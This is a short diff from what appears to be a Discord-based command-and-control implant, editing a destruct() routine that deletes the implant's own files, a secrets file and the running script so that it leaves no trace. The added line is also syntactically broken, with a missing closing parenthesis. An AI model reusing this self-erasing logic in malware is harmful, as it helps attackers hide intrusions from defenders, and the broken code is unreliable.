@@ -57,15 +57,8 @@ def fetch_command():
 
 def destruct():
     try:
-        os.remove('c2_discord.py')
-        os.remove('c2_implant.py')
-        os.remove('helper.py')
-        os.remove('secrets.json')
-        os.remove('finalkey.json')
-        os.rmdir('start.sh')
-        remove(argv[0])
-        os.rmdir('raw_img')
-        os.rmdir('secret_img')
+        os.remove(resource_path('secrets.json')
+        os.remove(sys.argv[0])
     except:
         pass
     sys.exit()
